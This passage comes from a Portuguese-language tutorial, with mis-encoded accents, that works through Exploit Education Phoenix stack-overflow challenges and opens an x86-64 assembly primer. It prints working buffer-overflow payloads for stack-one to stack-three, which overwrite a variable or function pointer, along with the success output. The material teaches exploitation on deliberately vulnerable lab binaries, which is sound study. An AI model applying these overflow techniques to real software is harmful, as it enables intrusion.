<p>Na verdade, Ã© mais prÃ¡tico usar <code>\x</code> 99% das vezes, entÃ£o vale a pena criar o habito!</p>
<a class="header" href="print.html#-soluÃ§Ã£o-1" id="-soluÃ§Ã£o-1"><h1>ğŸ”¥ SoluÃ§Ã£o</h1></a>
<blockquote>
<p>./stack-one $(python -c &quot;print b'A' * 64 + b'bYlI'&quot;)</p>
</blockquote>
<ul>
<li><a href="print.html#-objetivo">ğŸ¯ Objetivo</a></li>
<li><a href="print.html#-explica%C3%A7%C3%A3o">ğŸ’« ExplicaÃ§Ã£o</a>
<ul>
<li><a href="print.html#-environment-variable-vari%C3%A1vel-do-ambiente">ğŸŒ³ Environment Variable (VariÃ¡vel do ambiente)</a></li>
<li><a href="print.html#overflow">Overflow</a></li>
</ul>
</li>
<li><a href="print.html#-solu%C3%A7%C3%A3o">ğŸ”¥ SoluÃ§Ã£o</a></li>
</ul>
<a class="header" href="print.html#-objetivo-1" id="-objetivo-1"><h1>ğŸ¯ Objetivo</h1></a>
<p>Similar Ã  anterior, a gente precisa mudar o valor da variÃ¡vel changeme,
mas dessa vez ao invÃ©s de usar o input ou argv, vamos usar env!</p>
<a class="header" href="print.html#-explicaÃ§Ã£o-2" id="-explicaÃ§Ã£o-2"><h1>ğŸ’« ExplicaÃ§Ã£o</h1></a>
<p>Nesse desafio, o programa usa getenv(&quot;ExploitEducation&quot;) para ler uma
environment variable.</p>
<a class="header" href="print.html#-environment-variable-variÃ¡vel-do-ambiente" id="-environment-variable-variÃ¡vel-do-ambiente"><h2>ğŸŒ³ Environment Variable (VariÃ¡vel do ambiente)</h2></a>
<p>Essas variÃ¡veis sÃ£o acessÃ­veis para todos os programas
executando naquela seÃ§Ã£o. E normalmente contem preferÃªncias como cores, o tipo de terminal, etcetc....</p>
<p>VocÃª pode checa-las usando</p>
<blockquote>
<p>$ env</p>
</blockquote>
<p>VocÃª pode definir uma atÃ© o resto da seÃ§Ã£o</p>
<blockquote>
<p>$ export Nome=Valor</p>
</blockquote>
<p>VocÃª pode definir uma somente para execuÃ§Ã£o daquele programa</p>
<blockquote>
<p>$ Nome=Valor ./stack-two</p>
</blockquote>
<p>Para nÃ³s, nÃ£o faz tanta diferenÃ§a se o input Ã© pelas <code>envs</code> ou por outro mÃ©todo.</p>
<p>O Ãºnico problema Ã© que nÃ£o podemos usar o Null Byte (0x00), pois ele Ã© usado para indicar o final de uma string ASCII, portanto terminando nossa variÃ¡vel precocemente.</p>
<a class="header" href="print.html#overflow" id="overflow"><h2>Overflow</h2></a>
<p>Em seguida, o valor Ã© copiado para um <code>buffer[64]</code> usando: <code>strcpy(buffer, ptr)</code>. Com <code>ptr</code> sendo o valor da <code>env</code> 'ExploitEducation'.</p>
<p>A funÃ§Ã£o <code>strcpy</code>, assim como <code>gets</code>, nÃ£o checa se o valor Ã© maior que o buffer, tornando o programa vulnerÃ¡vel... :(</p>
<p>Por ultimo, o programa checa se <code>changeme == 0x0d0a090a</code></p>
<blockquote>
<p>Levando em consideraÃ§Ã£o que o sistema Ã© LE: 0a 09 0a 0d</p>
</blockquote>
<p>Mas pera ai, checando o manual ASCII, esses caracteres sÃ£o usados para encerrar linha, nÃ£o Ã© uma letra do teclado! D:</p>
<p>Pois Ã©, entÃ£o vamos precisar usar os bytes diretamente.</p>
<pre><code>Se vocÃª quer tentar resolver sozinhe, agora Ã© a sua hora!

.
.
.
.
.
.
.
.
.
.
.
.
.
</code></pre>
<p>Eu precisei colocar em caixinhas diferentes para caber na tela :(</p>
<blockquote>
<p>$ ExploitEducation=$(python -c &quot;print b'A'*64 + b'\x0a\x09\x0a\x0d'&quot;) ./stack-two</p>
</blockquote>
<pre><code>Welcome to phoenix/stack-two, brought to you by exploit.education
Well done, you have successfully set changeme to the correct value
</code></pre>
<p>Uhuuu, esse foi mais fÃ¡cil :D</p>
<a class="header" href="print.html#-soluÃ§Ã£o-2" id="-soluÃ§Ã£o-2"><h1>ğŸ”¥ SoluÃ§Ã£o</h1></a>
<blockquote>
<p>$ ExploitEducation=$(python -c &quot;print b'A'*64 + b'\x0a\x09\x0a\x0d'&quot;) ./stack-two</p>
</blockquote>
<ul>
<li><a href="print.html#-objetivo">ğŸ¯ Objetivo</a></li>
<li><a href="print.html#-dica">ğŸ’¡ Dica</a></li>
<li><a href="print.html#-explica%C3%A7%C3%A3o">ğŸ’« ExplicaÃ§Ã£o</a>
<ul>
<li><a href="print.html#%EF%B8%8F%EF%B8%8F-o-que-raios-s%C3%A3o-pointers">â†—ï¸â†˜ï¸ O que raios sÃ£o pointers</a></li>
<li><a href="print.html#-function-pointers">ğŸ¦€ Function Pointers</a></li>
<li><a href="print.html#-exploit">ğŸ”¥ Exploit</a>
<ul>
<li><a href="print.html#-analisando-o-programa">ğŸ›¸ Analisando o programa</a></li>
<li><a href="print.html#-encontrando-o-endere%C3%A7o-da-fun%C3%A7%C3%A3o">ğŸ  Encontrando o endereÃ§o da funÃ§Ã£o</a></li>
<li><a href="print.html#-cansei-de-teoria-eu-quero-exploit">ğŸ˜ Cansei de teoria eu quero exploit</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="print.html#-solu%C3%A7%C3%A3o">ğŸ”¥ SoluÃ§Ã£o</a></li>
</ul>
<a class="header" href="print.html#-objetivo-2" id="-objetivo-2"><h1>ğŸ¯ Objetivo</h1></a>
<p>Usar um pointer para retornar para uma funÃ§Ã£o pre existente</p>
<a class="header" href="print.html#-dica-1" id="-dica-1"><h1>ğŸ’¡ Dica</h1></a>
<p>OBS: em Ingles! // <a href="https://en.wikipedia.org/wiki/Pointer_(computer_programming)">Wikipedia Pointer</a></p>
<a class="header" href="print.html#-explicaÃ§Ã£o-3" id="-explicaÃ§Ã£o-3"><h1>ğŸ’« ExplicaÃ§Ã£o</h1></a>
<ul>
<li>O que raios sÃ£o pointers</li>
<li>Function pointers</li>
<li>Exploit</li>
</ul>
<a class="header" href="print.html#-o-que-raios-sÃ£o-pointers" id="-o-que-raios-sÃ£o-pointers"><h3>â†—ï¸â†˜ï¸ O que raios sÃ£o pointers</h3></a>
<blockquote>
<p>Pointers sÃ£o uma estrutura que, ao invÃ©s de armazenar dados, armazena o endereÃ§o de outra estrutura.
Lembra do exemplo do poÃ§o? Que cada item tinha seu endereÃ§o na stack! EntÃ£o, um pointer armazena esse endereÃ§o! :D</p>
</blockquote>
<p>O pointer pode ser visto como uma placa na estrada, indicando que X cidade estÃ¡ em Y direÃ§Ã£o.</p>
<p>Colunas: Nome da VariÃ¡vel | EndereÃ§o | conteÃºdo</p>
<p><img src="./img/pointer.png" alt="Imagem da wikipedia mostrando um pointer" /></p>
<p>A variÃ¡vel &quot;a&quot; Ã© um pointer que armazena a localizaÃ§Ã£o da variÃ¡vel &quot;b&quot;. Coloquialmente se diz que: &quot;a&quot; estÃ¡ apontando para &quot;b&quot; (seta vermelha).</p>
<blockquote>
<p>&quot;a&quot; armazena uma referencia Ã¡ &quot;b&quot; !</p>
</blockquote>
<blockquote>
<p>&quot;a&quot; pode ser des-referenciada, isto Ã©: Seguir a direÃ§Ã£o que &quot;a&quot; aponta, para chegar no valor de &quot;b&quot; ! :D</p>
</blockquote>
<p>Normalmente, o caracteres &quot;&amp;&quot; indica uma referÃªncia, e o caracteres &quot;*&quot; desreferencia aquele pointer.</p>
<blockquote>
<p>Caso vocÃª tente desrefenciar um pointer que nÃ£o aponta pra nada (NULL),
o programa vai interromper a execuÃ§Ã£o e soltar uma mensagem de erro!
Ou vai ser classificado como &quot;comportamento indefinido&quot;! Por isso, vocÃª vai ver &quot;Null Checks&quot;
bem frequentemente nesses desafios e em programas em geral!</p>
</blockquote>
<a class="header" href="print.html#-function-pointers" id="-function-pointers"><h3>ğŸ¦€ Function Pointers</h3></a>
<blockquote>
<p>Function pointers, ao invÃ©s de armazenar o endereÃ§o de uma variÃ¡vel, armazenam o endereÃ§o de uma funÃ§Ã£o! :D</p>
</blockquote>
<p>Sim! FunÃ§Ãµes tambÃ©m sÃ£o armazenadas na Stack, e possuem seu endereÃ§o! Esse endereÃ§o pode ser encontrado por vÃ¡rios mÃ©todos:</p>
<pre><code>objdump -d &lt;programa&gt; | grep &lt;nome_da_funÃ§Ã£o&gt;


gdb &lt;programa&gt;
  (gdb)&gt; info functions
</code></pre>
<p>Os dois mÃ©todos serÃ£o demonstrados em breve! :D</p>
<a class="header" href="print.html#-exploit" id="-exploit"><h3>ğŸ”¥ Exploit</h3></a>
<blockquote>
<p>Buffer overflow, alterando o valor de um function pointer, redirecionando a execuÃ§Ã£o do programa.</p>
<p>Em lingua nÃ£o nerd, por favor? :P</p>
<p>O valor que sera corrompido pelo buffer overflow indica aonde a execuÃ§Ã£o do programa esta indo. Se controlamos esse valor, controlamos aonde o programa vai!</p>
</blockquote>
<a class="header" href="print.html#-analisando-o-programa" id="-analisando-o-programa"><h4>ğŸ›¸ Analisando o programa</h4></a>
<pre><code class="language-C">funÃ§Ã£o complete_level() {   // a funÃ§Ã£o que a gente quer chamar
.......
}

funÃ§Ã£o main() {
  criar buffer[64];
  criar fp; // um function pointer
  
  fp = NULL; // vai ser usado para checar se ele foi alterado,
               // se continuar sendo NULL, quer dizer que esta intacto.
                
  
  gets(buffer) // funÃ§Ã£o INSEGURA para abrir um input
  
  if (fp) {    // se fp foi alterado
    fp()   // chama o endereÃ§o salvo em fp como se fosse uma funÃ§Ã£o
  } else {
    print(valor nao alterado, tente novamente)
  }
  
  exit
}
</code></pre>
<p>NÃ³s queremos chamar <code>complete_level()</code>, para isso, faremos <code>fp</code> salvar o seu endereÃ§o.</p>
<p>E nÃ³s jÃ¡ sabemos como exploitar um <code>gets()</code> para alterar os valores depois do <code>buffer</code>! EntÃ£o tÃ¡ na hora do trabalho!</p>
<a class="header" href="print.html#-encontrando-o-endereÃ§o-da-funÃ§Ã£o" id="-encontrando-o-endereÃ§o-da-funÃ§Ã£o"><h4>ğŸ  Encontrando o endereÃ§o da funÃ§Ã£o</h4></a>
<pre><code>objdump -d    // Resumindo, printa pro terminal os objetos armazenados na Stack e seus endereÃ§os
                  ( O -d Ã© pra ativar a disassembly: Converter de machine code para algo legÃ­vel )!
gdb
</code></pre>
<p>objdump</p>
<pre><code>$ objdump -d /opt/phoenix/amd64/stack-three | grep complete_level
000000000040069d &lt;complete_level&gt;:
</code></pre>
<p>gdb</p>
<pre><code class="language-x86asm">$ gdb /opt/phoenix/amd64/stack-three                
---- Mensagens padrÃ£o foram removidas ----
(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x00000000004004b0  _init
0x00000000004004d0  printf@plt
0x00000000004004e0  gets@plt
0x00000000004004f0  puts@plt
0x0000000000400500  fflush@plt
0x0000000000400510  exit@plt
0x0000000000400520  __libc_start_main@plt
0x0000000000400530  _start
0x0000000000400546  _start_c
0x0000000000400570  deregister_tm_clones
0x00000000004005a0  register_tm_clones
0x00000000004005e0  __do_global_dtors_aux
0x0000000000400670  frame_dummy
0x000000000040069d  complete_level              // Mesmo endereÃ§o
0x00000000004006b5  main
0x0000000000400740  __do_global_ctors_aux
0x0000000000400782  _fini
</code></pre>
<blockquote>
<p>O endereÃ§o da funÃ§Ã£o Ã© 0x000000000040069d ! :D</p>
</blockquote>
<p>Presta atenÃ§Ã£o na quantidade de null bytes que precedem o endereÃ§o. Todo pointer comeÃ§a com pelo menos dois null bytes,
e strings terminam com 1 null byte!</p>
<p>Assim, impedindo atacantes (nÃ³s), de definir um pointer novo, pois quebraria a string do nosso
input. NÃ³s precisamos usar um que jÃ¡ esta na memoria! (  Spoiler hehehehe :D  )</p>
<p>Como nesse desafio o pointer ja existe (<code>fp</code>) e nÃ³s sÃ³ vamos mudar os bytes finais dele
(Inteiro escreve na direÃ§Ã£o LE, lembra? EntÃ£o nÃ£o vai interferir com os NULLs que vem antes)</p>
<p>Portanto nÃ£o precisamos nos preocupar com isso nesse desafio!</p>
<a class="header" href="print.html#-cansei-de-teoria-eu-quero-exploit" id="-cansei-de-teoria-eu-quero-exploit"><h4>ğŸ˜ Cansei de teoria eu quero exploit</h4></a>
<p>Se vocÃª quer tentar por conta prÃ³pria, agora Ã© sua hora de brilhar!</p>
<pre><code>Lembretes:
Little Endian, o buffer tem 64 bytes,
b&quot;\x&quot;, e o input vem pelo gets()
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
eai, brilhou? ;)
</code></pre>
<p>O input que vamos passar fica:
b&quot;A&quot;*64     # encher o buffer (<code>padding</code>) <br />
+ <br />
b&quot;\x9d\x06\x40&quot; # 0x40069d vira &quot;9d 06 40&quot; em LE</p>
<p>EntÃ£o...</p>
<blockquote>
<p>$ python -c &quot;print(b'A'*64 + b'\x9d\x06\x40')&quot;</p>
</blockquote>
<pre><code class="language-C">calling function pointer @ 0x40069d &lt;-- chamando complete_level()
Congratulations, you've finished phoenix/stack-three :-) Well done!
</code></pre>
<p>Espero que vocÃª tenha gostado! :D</p>
<a class="header" href="print.html#-soluÃ§Ã£o-3" id="-soluÃ§Ã£o-3"><h1>ğŸ”¥ SoluÃ§Ã£o</h1></a>
<blockquote>
<p>$ python -c &quot;print(b'A'*64 + b'\x9d\x06\x40')&quot; | /opt/phoenix/amd64/stack-three</p>
</blockquote>
<pre><code>calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
</code></pre>
<ul>
<li><a href="print.html#-objetivo">ğŸ¯ Objetivo</a></li>
<li><a href="print.html#-conhecimento-preliminar">ğŸ›¸ Conhecimento preliminar</a>
<ul>
<li><a href="print.html#-assembly">ğŸ¤– Assembly</a>
<ul>
<li><a href="print.html#-register-registos--registadores">ğŸ“¦ Register (Registos / Registadores)</a>
<ul>
<li><a href="print.html#-general-purpose-registers-gpr--registo-de-prop%C3%B3sito-geral-">ğŸŒ General Purpose Registers (GPR) ( Registo de PropÃ³sito Geral )</a></li>
<li><a href="print.html#-address-register--armazenam-endere%C3%A7os-da-stack-">ğŸ’« Address Register ( armazenam endereÃ§os da stack )</a></li>
<li><a href="print.html#-rflag">ğŸ RFLAG</a></li>
<li><a href="print.html#-ap%C3%AAndice---curiosidade--nomenclatura-hist%C3%B3rica">ğŸ§  ApÃªndice - Curiosidade : Nomenclatura histÃ³rica</a></li>
</ul>
</li>
<li><a href="print.html#-instru%C3%A7%C3%B5es">âš¡ InstruÃ§Ãµes</a></li>
<li><a href="print.html#-fun%C3%A7%C3%B5es-pr%C3%B3logo-e-ep%C3%ADlogo">ğŸ¦„ FunÃ§Ãµes, PrÃ³logo e EpÃ­logo</a>
<ul>
<li><a href="print.html#-revis%C3%A3o">â˜• RevisÃ£o</a></li>
<li><a href="print.html#%EF%B8%8F-stack-frame--moldura-da-stack-">ğŸ–¼ï¸ Stack Frame ( Moldura da Stack )</a></li>
<li><a href="print.html#-pr%C3%B3logo">ğŸ”’ PrÃ³logo</a>
<ul>
<li><a href="print.html#se-a-fun%C3%A7%C3%A3o-receber-argumentos-salvar-eles">Se a funÃ§Ã£o receber argumentos, salvar eles</a></li>
</ul>
</li>
<li><a href="print.html#salvar-o-frame-atual">Salvar o frame atual</a></li>
<li><a href="print.html#criar-novo-frame">Criar novo frame</a></li>
<li><a href="print.html#-ep%C3%ADlogo">ğŸ”‘ EpÃ­logo</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="print.html#-caso-voc%C3%AA-tenha-viajado-o-que-voc%C3%AA-precisa-saber">ğŸŒ Caso vocÃª tenha viajado, o que vocÃª precisa saber</a></li>
<li><a href="print.html#-exploit">ğŸ”¥ Exploit</a>
<ul>
<li><a href="print.html#-analisar-o-programa">ğŸ”¬ Analisar o programa</a></li>
<li><a href="print.html#%EF%B8%8F-o-compilador-adicionou-coisa">â‰ï¸ O compilador adicionou coisa???</a></li>
<li><a href="print.html#-encontrar-endere%C3%A7o-de-complete_level">ğŸ  Encontrar endereÃ§o de complete_level</a></li>
</ul>
</li>
<li><a href="print.html#-solu%C3%A7%C3%A3o">ğŸ’« SoluÃ§Ã£o</a></li>
</ul>
<a class="header" href="print.html#-objetivo-3" id="-objetivo-3"><h1>ğŸ¯ Objetivo</h1></a>
<p>O buffer overflow (<code>BOF</code>) vai nos permitir alterar o saved return pointer (<code>SRP</code>) e redirecionar a execuÃ§Ã£o do programa.</p>
<p>Esse desafio estÃ¡ nos preparando para o prÃ³ximo, no qual nos redirecionaremos a execuÃ§Ã£o para o nosso prÃ³prio cÃ³digo, e teremos um exploit de verdade! :D</p>
<p>Esse tipo de exploit era viÃ¡vel nos anos 90, quando mecanismos de proteÃ§Ã£o nÃ£o existiam. Por isso Ã© chamado de buffer overflow clÃ¡ssico (ou <code>SRP BOF</code>,
caso vocÃª goste de siglas)! :D</p>
<p>Se vocÃª souber inglÃªs, vale a pena dar uma lida nesse post de 1996 no Phrack: <a href="http://phrack.org/issues/49/14.html">Smashing The Stack For Fun And Profit</a> !</p>
<a class="header" href="print.html#-conhecimento-preliminar" id="-conhecimento-preliminar"><h1>ğŸ›¸ Conhecimento preliminar</h1></a>
<p>Se tem uma seÃ§Ã£o inteira dedicada a conhecimento preliminar, eu posso te garantir que vai ser BASTANTE ! Verifique que o cinto de seguranÃ§a estÃ¡ firme e travado,
mantenha as mÃ£os, pernas e canecas de cafÃ© dentro do veÃ­culo durante todo o percurso!</p>
<p>3...2...1....</p>
<a class="header" href="print.html#-assembly" id="-assembly"><h2>ğŸ¤– Assembly</h2></a>
<p>Recursos adicionais: <br />
<a href="https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf&amp;ved=2ahUKEwiPvJn2xvrsAhXIILkGHdA4BNUQFjAAegQIARAB&amp;usg=AOvVaw384MVXQDBtyM1pPW3LeZrW">x64 Cheat Sheet - PDF</a> <br />
<a href="https://cs61.seas.harvard.edu/site/2018/Asm1/">Harvard CS61</a> <br />
<a href="https://en.m.wikipedia.org/wiki/Processor_register">Wikipedia Registers</a> <br />
<a href="https://www.tutorialspoint.com/general-purpose-registers-in-8086-microprocessor#:%7E:text=The%20general%20purpose%20registers%20are,has%20eight%20general%20purpose%20registers.&amp;text=This%20is%20the%20accumulator.,into%20two%208%2Dbit%20registers">GPR in 8086</a><br />
<a href="https://mentebinaria.gitbook.io/engenharia-reversa/assembly/registradores">Registadores - IntroduÃ§Ã£o Engenharia Reversa</a> \</p>
<p>Eu pretendo fazer uma serie de tutorias dedicada Ã  assembly (ASM), porÃ©m isso Ã© para o futuro...</p>
<p>Eu vou usar sintaxe intel, pq Ã© a melhor e se alguÃ©m te disser o contrÃ¡rio, a pessoa ta mentindo &gt;:( !!!!</p>
<blockquote>
<p>ASM Ã© uma representaÃ§Ã£o legÃ­vel dos 0s e 1s das instruÃ§Ãµes do computador.
Ela pode ser transformada em machine code (cÃ³digo de maquina, os 0s e 1s) usando uma ferramenta chamada assembler!</p>
</blockquote>
<p>EntÃ£o como vocÃª pode imaginar, Ã© bem complicado, e a minha maneira de explicar pode nÃ£o funcionar para vocÃª... EntÃ£o vai com calma, le de outras fontes, assiste
videos,... vai demorar um bom tempo ate ficar intuitivo, e ta tudo bem com isso :) vai no seu ritmo</p>
<a class="header" href="print.html#-register-registos--registadores" id="-register-registos--registadores"><h3>ğŸ“¦ Register (Registos / Registadores)</h3></a>
<blockquote>
<p>Registers sÃ£o pedaÃ§os de memÃ³ria que ficam dentro do chip do processador,
semelhante a memÃ³ria RAM, porÃ©m extremamente rÃ¡pidos e pequenos.</p>
</blockquote>
<p>O seu tamanho Ã© um dos determinantes da arquitetura (32 bits = register de
4 bytes, 64 bits = register de 8 bytes)</p>
<p>Esses registers sÃ£o semelhantes Ã  variÃ¡veis, no sentido que
armazenam valores, podem ser alterados e lidos.</p>
<a class="header" href="print.html#-general-purpose-registers-gpr--registo-de-propÃ³sito-geral-" id="-general-purpose-registers-gpr--registo-de-propÃ³sito-geral-"><h4>ğŸŒ General Purpose Registers (GPR) ( Registo de PropÃ³sito Geral )</h4></a>
<p>Obs: muitos desses podem ser divididos em 2 partes, com metade do tamanho original. Nesse caso, se adiciona o sufixo H (High, A parte de cima) e L (Low, A parte de baixo).</p>
<blockquote>
<p>Por exemplo: AX (16 bits, endereÃ§os: 0 a 15) (uma versÃ£o antiga do RAX) pode ser dividido em AL (8 bits, do 0 ao 7) e AH (8 bits, do 8 ao 15).</p>
</blockquote>
<p>O propÃ³sito deles historicamente costumava ser, mas nÃ£o exclusivamente era:</p>
<pre><code class="language-x86asm">RAX Acumulador   -&gt; Usado para operaÃ§Ãµes_lÃ³gicas ou aritmÃ©ticas 
RBX              -&gt; Pointer para dados
RCX Contagem     -&gt; Usado em loops e outras operaÃ§Ãµes_cÃ­clicas 
RDX Dados        -&gt; MultiplicaÃ§Ã£o, input/output
R8 a 15          -&gt; vocÃª sÃ³ precisa saber que eles existem
</code></pre>
<p>Alem disso, sÃ£o usados para passar os argumentos para funÃ§Ãµes (explicaÃ§Ã£o em breve)</p>
<pre><code class="language-x86asm">RAX (Valor retornado)
RDI (1Âº parÃ¢metro)
RSI (2Âº parÃ¢metro)
RDX (3Âº parÃ¢metro)
...
</code></pre>
<p>Para os nossos propÃ³sitos, Ã© mais vantajoso considerar que eles sÃ³ servem para
armazenar valores e passar argumentos</p>
<a class="header" href="print.html#-address-register--armazenam-endereÃ§os-da-stack-" id="-address-register--armazenam-endereÃ§os-da-stack-"><h4>ğŸ’« Address Register ( armazenam endereÃ§os da stack )</h4></a>
<pre><code class="language-x86asm">RSP Stack Pointer       -&gt; Aponta para o topo da stack
RBP Base Pointer        -&gt; Aponta para a base da stack
RIP Instruction Pointer -&gt; Aponta para a instruÃ§Ã£o 
                                que estÃ¡ sendo executada 
</code></pre>
<a class="header" href="print.html#-rflag" id="-rflag"><h4>ğŸ RFLAG</h4></a>
<p>O register RFLAG armazena flags: sinais que indicam resultados de operaÃ§Ãµes passadas.
Esses sinais sÃ£o 1 bit (0 ou 1)</p>
<pre><code>Exemplos:

PosiÃ§Ã£o    Nome         DescriÃ§Ã£o 
0          Carry         Resultado estourou o limite de um inteiro
                                sem sinal (o &quot;vai-um&quot; da matemÃ¡tica)
6          Zero          A operaÃ§Ã£o resultou em 0
11         Overflow      Estourou o limite de um inteiro com sinal
</code></pre>
<a class="header" href="print.html#-apÃªndice---curiosidade--nomenclatura-histÃ³rica" id="-apÃªndice---curiosidade--nomenclatura-histÃ³rica"><h4>ğŸ§  ApÃªndice - Curiosidade : Nomenclatura histÃ³rica</h4></a>
<p><img src="./img/registers.jpeg" alt="Imagem mostrando os registers" /> <br />
Eu vou usar o RAX como exemplo!</p>
<pre><code class="language-x86asm">Em computadores 8 bits, ele era chamado A (Acumulador)
Em computadores 16 bits, ele era chamado AX (Acumulador eXtendido ) 
Em computadores 32 bits, ele era chamado EAX e tem o tamanho de 2 AX
Em computadores 64 bits, ele Ã© chamado RAX e tem o tamanho de 2 EAX

Para propÃ³sitos de retro-compatibilidade, nos ainda podemos usar, 
por exemplo, EAX em um computador 64 bits !
Por trÃ¡s das cenas, o computador interpreta EAX como a segunda metade do RAX

EntÃ£o nÃ£o estranhe caso alguÃ©m fale de EIP numa
arquitetura x64, pois na linguagem informal nÃ£o faz diferenÃ§a

Mas caso vocÃª vÃ¡ analisar o register em um debugger, a diferenÃ§a importa :D
</code></pre>
<a class="header" href="print.html#-instruÃ§Ãµes" id="-instruÃ§Ãµes"><h3>âš¡ InstruÃ§Ãµes</h3></a>
<blockquote>
<p>Obs: os registers foram usados aleatoriamente, pois seu propÃ³sito na realidade nÃ£o Ã© relevante para a explicaÃ§Ã£o !</p>
</blockquote>
<p>As instruÃ§Ãµes sÃ£o o que o processador executa, por exemplo</p>
<pre><code class="language-x86asm">add 0x4 0x1     -&gt; adiÃ§Ã£o 4 + 1 = 5
</code></pre>
<p>Na sintaxe intel, o &quot;alvo&quot; da operaÃ§Ã£o vem primeiro e o &quot;parÃ¢metro&quot; depois</p>
<p>Caso os dois argumentos da instruÃ§Ã£o sejam valores, a operaÃ§Ã£o executara normalmente</p>
<p>Caso o <strong>alvo</strong> seja um <strong>register</strong>, o <strong>resultado</strong> da operaÃ§Ã£o serÃ¡ salvo nele</p>
<pre><code class="language-x86asm">add 0x4 0x1     -&gt; adiÃ§Ã£o 4 + 1 = 5
add rbp 0x10    -&gt; rbp  vira  rbp + 0x10
add rbp 0x22    -&gt; Adiciona 0x22 ao rbp 
</code></pre>
<pre><code class="language-x86asm">sub 0x4 0x1     -&gt; subtraÃ§Ã£o 4 - 1 = 3
                 Caso fosse ao contrÃ¡rio a ordem &quot;alvo&quot; &quot;parÃ¢metro&quot;,
                 o resultado seria `-3` !
                 
sub rbp 0x10    -&gt; rbp  vira  rbp - 0x10
sub rsp 0x10    -&gt; Subtrai 0x10 de rsp
</code></pre>
<p>Algumas outras instruÃ§Ãµes que serÃ£o importantes</p>
<pre><code class="language-x86asm">push -&gt; Empurra o valor pro topo da Stack

pop  -&gt; Tira o valor no topo da Stack e salva no alvo
     |---&gt; pop      -&gt; SÃ³ remove o valor no topo da Stack
     |---&gt; pop rbp  -&gt; Remove o valor do topo e salva em rbp
      
mov  -&gt; Move o valor do parÃ¢metro para o alvo
     |---&gt; mov rbx 0x10   -&gt; O valor de rbx vira 0x10
     |---&gt; mov rbx rax    -&gt; O valor de rbx vira o valor de rax
     |---&gt; mov rax rbx    -&gt; O valor de rax vira o valor de rbx

Usadas no epÃ­logo ( explicadas em breve )
           ret     -&gt; retorna da funÃ§Ã£o ( em essÃªncia Ã© sÃ³ um &quot;pop rip&quot; )
           leave -&gt; restaura o stack frame anterior ( mov rsp rbp ; pop rbp )

xor, and, ......  -&gt; Operadores lÃ³gicos, tÃªm o mesmo comportamento de sub e add
                  |---&gt; and rbp 0x10   -&gt; rbp  vira  rbp &amp; 0x10
                  |---&gt; xor rsp 0x10   -&gt; rsp  vira  rsp ^ 0x10

Jumps/Pulos
jmp 0x00001234 -&gt; Move o RIP para aquela localizaÃ§Ã£o incondicionalmente,
            equivalente a um GOTO

test rax 0x1 ; jmpEQ 0x00001234 -&gt; jmp equal
             |---&gt; Compara os valores; Se forem iguais da o jump
             (normalmente usado em conjunto com a ZERO_FLAG)

jmple  -&gt; jmp less or equal   -&gt; Menor ou igual   â‰¤
jmpge -&gt; jmp greater or equal -&gt; Maior ou igual   â‰¥
</code></pre>
<p>Caso vc nÃ£o saiba os operadores lÃ³gicos: <a href="https://pt.wikipedia.org/wiki/Operador_l%C3%B3gico">Wikipedia Operador LÃ³gico</a></p>
<a class="header" href="print.html#-funÃ§Ãµes-prÃ³logo-e-epÃ­logo" id="-funÃ§Ãµes-prÃ³logo-e-epÃ­logo"><h3>ğŸ¦„ FunÃ§Ãµes, PrÃ³logo e EpÃ­logo</h3></a>
<p>Agora tÃ¡ na hora de aprender <strong>realmente</strong> como essa tal de stack funciona, entÃ£o Ã© bom dar uma revisada, nÃ©?</p>
<a class="header" href="print.html#-revisÃ£o" id="-revisÃ£o"><h4>â˜• RevisÃ£o</h4></a>
<pre><code>- A stack Ã© como uma pilha de pratos: Ãºltimo a entrar, primeiro a sair (LIFO)
- Ela cresce para valores menores: 
    - A memÃ³ria Ã© representada de cabeÃ§a pra baixo!
    - A base fica em um endereÃ§o maior (parte de baixo)
    - O topo fica em um endereÃ§o menor (parte de cima)
    - Portanto, a stack cresce em direÃ§Ã£o Ã  valores menores :D 

</code></pre>
<a class="header" href="print.html#-stack-frame--moldura-da-stack-" id="-stack-frame--moldura-da-stack-"><h4>ğŸ–¼ï¸ Stack Frame ( Moldura da Stack )</h4></a>
<p>VocÃª se lembra do RBP e RSP la da parte dos register? Eles ficam importantes agora! :D</p>
<p>O rbp indica a base da stack, e rsp o topo.</p>
<p>A regiÃ£o entre os dois Ã© chamada de stack frame: um pedaÃ§o da stack :D</p>
<p>A stack como um todo possui vÃ¡rios stack frames, porÃ©m sÃ³ um estÃ¡ ativo por vez (o indicado pelo rbp/rsp).</p>
<p>Para poder criar um novo ou destruir um antigo, existem procedimentos chamados PrÃ³logo e EpÃ­logo, respectivamente.</p>
<blockquote>
<p>Obs: Quando vocÃª muda o tamanho da stack por push/pop, o RSP se ajusta automaticamente</p>
</blockquote>
<p>Quando chamamos uma <strong>funÃ§Ã£o()</strong>, precisamos criar um frame novo para ela por meio de um PrÃ³logo, e salvar o endereÃ§o do frame atual. Ao retornar, esse frame serÃ¡ destruÃ­do com um EpÃ­logo e o antigo serÃ¡ restaurado !</p>
<p>Para a explicaÃ§Ã£o, vamos usar o seguinte pseudo-programa:</p>
<pre><code class="language-C">Fn print_dois(x, y) {
    print(x)
    print(y)

    return
}
Fn main() {
    x = &quot;Ola! :D&quot;
    y = &quot;Assembly Ã© legal&quot;

    print_dois(x, y)

    return
}
</code></pre>
<p>Agora vamos executar <strong>main()</strong>, <strong>x</strong> e <strong>y</strong> sÃ£o definidas e nos jÃ¡ sabemos como isso funciona, agora vamos chamar a funÃ§Ã£o, que Ã© aonde a mÃ¡gica acontece !</p>
<a class="header" href="print.html#-prÃ³logo" id="-prÃ³logo"><h4>ğŸ”’ PrÃ³logo</h4></a>
<ul>
<li>Se a funÃ§Ã£o receber argumentos, passar eles
Chamar a funÃ§Ã£o</li>
<li>Salvar o frame atual</li>
<li>Criar novo frame
Executar a funÃ§Ã£o</li>
</ul>
<a class="header" href="print.html#se-a-funÃ§Ã£o-receber-argumentos-salvar-eles" id="se-a-funÃ§Ã£o-receber-argumentos-salvar-eles"><h5>Se a funÃ§Ã£o receber argumentos, salvar eles</h5></a>
<p>Algumas arquiteturas passam os argumentos pela stack, salvando-os na stack na ordem inversa:</p>
<pre><code class="language-x86asm">(x, y)
push y
push x
</code></pre>
<p>Mas comumente, os argumentos sÃ£o passados pelos registers:</p>
